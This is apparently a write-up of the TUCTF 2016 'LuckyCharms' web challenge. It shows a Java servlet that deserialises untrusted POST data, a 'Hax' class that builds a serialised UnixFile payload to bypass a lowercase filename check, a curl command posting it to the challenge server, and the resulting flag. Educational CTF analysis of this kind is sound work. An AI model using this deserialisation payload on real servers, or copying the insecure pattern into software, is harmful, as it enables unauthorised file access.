# TUCTF 2016: LuckyCharms

## Challenge details
| Event | Challenge | Category | Points |
|:------|:----------|:---------|-------:|
| TUCTF | LuckyCharms | Web | 150 |

### Description
> Nothing like cereal and coffee to start your day!
>
> http://146.148.10.175:1033/LuckyCharms
> 

## First steps

by visiting http://146.148.10.175:1033/LuckyCharms we can see a hidden link in the html-source:

```html
<html>
<body>
Frosted Lucky Charms,
<br>
They're magically delicious!
<br>
<img src="https://upload.wikimedia.org/wikipedia/en/f/ff/Lucky-Charms-Cereal-Box-Small.jpg">
<!-- <a href="/?look=LuckyCharms.java"></a> -->
</body>
</html>

```

Lets try that URL:  http://146.148.10.175:1033/LuckyCharms?look=LuckyCharms.java


```java

import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;
import java.nio.file.Path;
import java.nio.file.Paths;

abstract class OSFile implements Serializable {
  String file = "";
  abstract String getFileName();
}

class WindowsFile extends OSFile  {
  public String getFileName() {
    //Windows filenames are case-insensitive
    return file.toLowerCase();
  }
}

class UnixFile extends OSFile {
  public String getFileName() {
    //Unix filenames are case-sensitive, don't change
    return file;
  }
}

public class LuckyCharms extends HttpServlet {

  public void init() throws ServletException {}

  public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
    doPost(request, response);
  }

  public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
      
    response.setContentType("text/html");
    PrintWriter out = response.getWriter();

    OSFile osfile = null;
    try {
      osfile = (OSFile) new ObjectInputStream(request.getInputStream()).readObject();
    } catch (Exception e) {
      //Oops, let me help you out there
      osfile = new WindowsFile();
      if (request.getParameter("look") == null) {
        osfile.file = "charms.html";
      } else {
        osfile.file = request.getParameter("look");
      }
    }

    String f = osfile.getFileName().replace("/","").replace("\\","");
    if (f.contains("flag")) {
      //bad hacker!
      out.println("You'll Never Get Me Lucky Charms!");
      return;
    }

    try {
      Path path = Paths.get(getServletContext().getRealPath(f.toLowerCase()));  
      String content = new String(java.nio.file.Files.readAllBytes(path));
      out.println(content);
     } catch (Exception e) {
        out.println("Nothing to see here");
     }
  }

  public void destroy() {}
}



```

Lets see what the application actually does:

If a GET-request is made, the application accepts a parameter called 'look' (which we just used to disclose the source code). To make sure we can't read any arbitrary file some checks are added:

```java
String f = osfile.getFileName().replace("/","").replace("\\","");
if (f.contains("flag")) {
```

Here we see that first, all occurences of / and \\\\ are removed so we cant traverse to higher directories. Additionally, a contains-method checks if 'flag' is not a substring of the file we want to disclose. 

Now, .contains() is case-sensitive, so if we can get something like FLAG in our filename, it wont match and we can bypass the check. 

```java
class WindowsFile extends OSFile  {
  public String getFileName() {
    //Windows filenames are case-insensitive
    return file.toLowerCase();
  }
}
```

If we look at the getFilename() method, however, we see that the string we enter is always lowercase'd by the application.

Luckily for us, a GET-request with the look-param isnt the only way to set the filename. The program also accepts POST-requests.

```java
try {
      osfile = (OSFile) new ObjectInputStream(request.getInputStream()).readObject();
    } catch (Exception e) {
```

When a POST-request is made, the application unserializes the raw input stream pushed to the application. Also, next to the WindowsFile-class the server itself uses, there is also a class called UnixFile defined, which does not enforce lower-casing of the filename property! 

```java
class UnixFile extends OSFile {
  public String getFileName() {
    //Unix filenames are case-sensitive, don't change
    return file;
  }
}
```

## Exploitation
To exploit this vulnerability, we need to craft a serialized binary version of UnixFile, with the 'file' property set to 'FLAG' 

We can easily craft such a file with java

```java
import java.io.*;


abstract class OSFile implements Serializable {
  String file = "";
  abstract String getFileName();
}

class UnixFile extends OSFile {
  public String getFileName() {
    //Unix filenames are case-sensitive, don't change
    return file;
  }
}


public class Hax {

    public static void main(String[] args) {
	UnixFile f = new UnixFile();
      	f.file = "FLAG";
	try
	{
		FileOutputStream fileOut = new FileOutputStream("/tmp/Hax.bin");
         	ObjectOutputStream out = new ObjectOutputStream(fileOut);
         	out.writeObject(f);
         	out.close();
         	fileOut.close();
         	System.out.printf("Serialized data is saved in /tmp/Hax.bin\n");
       	}catch(IOException i)
      	{
          	i.printStackTrace();
      	}

    }

}
```

By compiling the above script and running it:

```bash
$ javac Hax.java && java Hax
Serialized data is saved in /tmp/Hax.bin
```

We will end up with a binary object in /tmp/Hax.bin

```bash
$file Hax.bin 
Hax.bin: Java serialization data, version 5
```

Finally, if we post this object to the LuckyCharms script on the server:

```bash
$ curl -X POST --data-binary @Hax.bin 'http://146.148.10.175:1033/LuckyCharms'
```

We get the flag

```bash
TUCTF{a_cup_of_joe_keeps_the_hackers_away}
```


